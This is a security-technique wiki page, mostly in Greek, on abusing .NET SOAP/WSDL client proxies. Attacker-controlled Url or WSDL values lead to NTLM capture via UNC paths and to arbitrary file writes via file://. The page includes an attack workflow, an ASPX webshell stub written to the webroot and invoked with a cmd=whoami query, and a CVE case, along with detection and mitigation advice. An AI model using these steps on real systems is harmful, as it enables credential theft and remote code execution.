# .NET SOAP/WSDL Client Proxy Abuse

{{#include ../../banners/hacktricks-training.md}}

## Συνοπτικά

- `SoapHttpClientProtocol`, `DiscoveryClientProtocol` και συγγενείς κληρονομούν από `HttpWebClientProtocol`, του οποίου το `GetWebRequest()` επιστρέφει την αγνωστική ως προς το scheme `WebRequest` που παράγεται από `WebRequest.Create()` χωρίς να επιβάλει `HttpWebRequest`.
- Αν ένας επιτιθέμενος ελέγχει το proxy `Url`, το framework σιωπηλά αντικαθιστά με `FileWebRequest`, `FtpWebRequest` ή UNC/SMB handlers, μετατρέποντας "HTTP" proxies σε NTLM leak gadgets ή σε μηχανισμούς εγγραφής αρχείων.
- Οποιοδήποτε χαρακτηριστικό που εισάγει WSDL που προέρχεται από επιτιθέμενο με `ServiceDescriptionImporter` επιδεινώνει το σφάλμα: το WSDL ελέγχει τον κατασκευαστή του παραγόμενου proxy, τις μεθόδους SOAP, τους complex types και τα namespaces, επιτρέποντας pre-auth RCE (webshells, script drops) σε προϊόντα όπως Barracuda Service Center RMM, Ivanti EPM, Umbraco 8, PowerShell και SSIS.

## Root cause: HttpWebClientProtocol is scheme-agnostic

`WebClientProtocol.GetWebRequest()` κάνει `var req = WebRequest.Create(uri)` και το επιστρέφει άθικτο. `HttpWebClientProtocol.GetWebRequest()` επιχειρεί `req as HttpWebRequest` για να θέσει πεδία μόνο για HTTP, αλλά **επιστρέφει παρόλα αυτά το αρχικό `req`** ακόμα κι αν η μετατροπή αποτύχει. Επομένως η runtime συμπεριφέρεται ανάλογα με το scheme που βρίσκεται στο `Url`:

- `http(s)://` → `HttpWebRequest`
- `file:///` ή `\\host\share\` → `FileWebRequest`
- `ftp://` → `FtpWebRequest`

`SoapHttpClientProtocol.Invoke()` στη συνέχεια ρέει (streams) το SOAP POST σώμα μέσω οποιουδήποτε transport handler έχει επιλεχθεί, ακόμη κι αν αυτό σημαίνει εγγραφή σε δίσκο ή πάνω από SMB.

## Primitive 1 – NTLM capture / relay via UNC targets

1. Αποκτήστε έλεγχο πάνω στο `SoapHttpClientProtocol.Url` (άμεσο setter, τιμή config, γραμμή βάσης δεδομένων κ.λπ.).
2. Δείξτε το σε ένα UNC path όπως `file://attacker.local/sink/payload`.
3. Η CLR ανοίγει το path μέσω SMB και εκτελεί integrated authentication, εκθέτοντας το NTLM challenge/response στον επιτιθέμενο.
4. Χρησιμοποιήστε τα captured hashes για offline cracking ή NTLM relay (SMB/HTTP) αν δεν υπάρχει signing/EPA.

Αυτό ισχύει για **οποιονδήποτε** .NET SOAP/HTTP proxy κώδικα που αποδέχεται input από χρήστη, ακόμα κι αν δεν υπάρχει περαιτέρω δυνατότητα εκμετάλλευσης.

## Primitive 2 – Arbitrary file writes via `file://`

1. Ορίστε `Url = "file:///inetpub/wwwroot/poc.aspx"` (ή οποιοδήποτε γράψιμο path) πριν την κλήση του proxy.
2. Κάντε invoke οποιασδήποτε SOAP μεθόδου; το framework γράφει ολόκληρο το SOAP envelope στο επιλεγμένο path, αντικαθιστώντας υπάρχοντα αρχεία.
3. Τα επιχειρήματα που ελέγχονται από τον χρήστη εμφανίζονται μέσα σε XML στοιχεία, επιτρέποντας σε επιτιθέμενους να ανεβάσουν CSHTML/ASPX payloads ή να μολύνουν αρχεία config.

Περιορισμοί:

- Το περιεχόμενο είναι πάντα XML· τα scalar fields είναι entity-encoded, οπότε η ένεση `<script>` μέσω απλών strings απαιτεί επιπλέον τεχνάσματα.
- Σημαντικά payloads χρειάζονται τουλάχιστον ένα επιχειρήμα επηρεασμένο από τον επιτιθέμενο ή τη δυνατότητα τροποποίησης της υπογραφής της μεθόδου (βλέπε WSDL abuse).

Στη runtime συχνά εμφανίζεται `Client found response content type of 'application/octet-stream', but expected 'text/xml'` μετά την εγγραφή — θεωρήστε αυτό το σφάλμα ως IOC.

## Weaponizing WSDL imports

### Auto-generated proxies via `ServiceDescriptionImporter`

Πολλά προϊόντα εκθέτουν δυνατότητες "custom web service" που δέχονται ένα WSDL URL, και στη συνέχεια:

1. `ServiceDescription.Read()` το WSDL που ελέγχει ο επιτιθέμενος.
2. `ServiceDescriptionImporter` παράγει C# proxy κλάσεις που επεκτείνουν `SoapHttpClientProtocol`.
3. CodeDOM κάνει compile τον proxy και reflection καλεί την αιτούμενη μέθοδο.

Ο επιτιθέμενος ελέγχει πλήρως:

- `soap:address` / `soap12:address` `location` → γίνεται `base.Url` (μπορεί να ορίσει `file://` ή UNC paths).
- Ονόματα μεθόδων, λίστες παραμέτρων, complex types και serializers.
- Namespace URIs που καταλήγουν ως `xmlns:*` attributes σε κάθε SOAP μήνυμα.

Δεν γίνεται έλεγχος scheme, οπότε κάθε παραγόμενος proxy κληρονομεί το αρχικό σχεδιαστικό σφάλμα.

### Shaping the SOAP envelope for RCE

- Complex type serialization: Ορίστε custom structs στο WSDL έτσι ώστε όταν το `XmlSerializer` τα επανεκτυπώνει, να παράγουν element names/attributes που επιλέγει ο επιτιθέμενος. Για drops webshells ASPX, δημιουργήστε types που σειριοποιούνται σε:
```xml
<script runat="server">
// payload pulling `Request.QueryString["cmd"]`
</script>
```
και στοχεύστε `Url` σε `file:///.../webroot/shell.aspx` για RCE.
- Namespace injection: Ακόμα κι όταν τα arguments είναι hard-coded (π.χ. Umbraco Forms), τα namespaces που δηλώνονται στο WSDL (π.χ. `xmlns:tns="http://host/service?x=@{...}"`) αντιγράφονται αυτούσια στο SOAP envelope. Η κωδικοποίηση payloads μέσα σε query string των namespaces επιτρέπει CSHTML Razor ή PowerShell script drops χωρίς έλεγχο παραμέτρων.

Αυτές οι τεχνικές τροφοδότησαν το exploit κατά του Barracuda Service Center RMM (CVE-2025-34392): μια μη-εξουσιοδοτημένη SOAP κλήση παρείχε κακόβουλο WSDL, όριζε `soap12:address` σε `file:///Program Files/.../SCMessaging/poc.aspx`, εισήγαγε `<script runat="server">` μέσω complex parameters, και ανέβασε webshell που εκτέλεσε arbitrary `cmd.exe` εντολές.

## Typical attack workflow

1. Εντοπίστε λειτουργικότητα που δέχεται WSDL URL ή που επιτρέπει στους χρήστες να διαμορφώσουν SOAP endpoints (π.χ., Barracuda `InvokeRemoteMethod`, Ivanti EPM connectors, Umbraco 8 Forms datasources, PowerShell `New-WebServiceProxy`).
2. Φιλοξενήστε ένα κακόβουλο WSDL του οποίου το `soap:address` δείχνει σε ένα writable path ή UNC share και των οποίων τα schema definitions παρέχουν μεθόδους/types φιλικά για payload.
3. Προκαλέστε το import/compilation. Ο στόχος εκδίδει ένα proxy DLL με constructor και μεθόδους ελεγχόμενες από τον επιτιθέμενο.
4. Όταν η εφαρμογή καλεί την παραχθείσα μέθοδο, το SOAP request σειριοποιείται και γράφεται στο path που όρισε ο επιτιθέμενος, ενσωματώνοντας το payload.
5. Εκτελέστε το dropped αρχείο (πλοηγηθείτε σε `poc.aspx?cmd=whoami`, φορτώστε το CSHTML, ή αφήστε το PowerShell να τρέξει το script) ή επαναχρησιμοποιήστε τα captured NTLM δεδομένα.

## Detection & hunting

- Static analysis: Αναζητήστε `ServiceDescriptionImporter`, `SoapHttpClientProtocol`, `HttpWebClientProtocol`, ή `New-WebServiceProxy`. Ανιχνεύστε πώς προέρχονται τα `Url` ή τα WSDL inputs—οτιδήποτε ελέγχεται από χρήστη είναι κόκκινο σημάδι.
- Runtime telemetry:
- Instrument την δημιουργία proxy για να καταγράφετε schemes; ειδοποιήστε για `file`, `ftp`, ή UNC τιμές.
- Παρακολουθήστε για το χαρακτηριστικό σφάλμα "Client found response content type of 'application/octet-stream'" μετά από SOAP κλήσεις.
- Παρακολουθήστε απροβλέπτες `.aspx/.cshtml/.ps1` εγγραφές κάτω από καταλόγους εφαρμογής που εκτελούνται από την ταυτότητα του web service.
- Network/file σήματα: Συνδέσεις SMB που ξεκινούν από web servers προς υποδομή επιτιθέμενου, ή ξαφνική compilation προσωρινών proxy DLLs, συχνά προηγούνται της εκμετάλλευσης.

## Mitigations

- Enforce transport validation πριν καλέσετε οποιονδήποτε proxy που προέρχεται από `HttpWebClientProtocol`:
```csharp
var uri = new Uri(proxy.Url);
if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
throw new InvalidOperationException("SOAP clients must stay on HTTP/S");
```
- Sanitize imported WSDL: Κάντε proxy downloads μέσω ενός broker που επαναγράφει ή απορρίπτει `soap:address` entries που δεν είναι HTTP/S, απορρίπτει άγνωστα bindings, και απαγορεύει namespace payload tricks.
- Disable untrusted WSDL features: Αντικαταστήστε τις ευκολίες "upload a WSDL" με vetted, server-side templates ή allowlists.
- Segregate write locations: Βεβαιωθείτε ότι τα app pools δεν μπορούν να γράψουν σε executable directories; χρησιμοποιήστε ξεχωριστούς τόμους για data vs. code ώστε τα file-write primitives να μην γίνονται RCE.
- Harden NTLM exposure: Απενεργοποιήστε outbound SMB όπου είναι δυνατόν; αλλιώς επιβάλετε SMB signing, EPA και άλλα mitigations κατά του relay.

## References

- [watchTowr Labs – SOAPwn: Pwning .NET Framework Applications Through HTTP Client Proxies and WSDL](https://labs.watchtowr.com/soapwn-pwning-net-framework-applications-through-http-client-proxies-and-wsdl/)

{{#include ../../banners/hacktricks-training.md}}
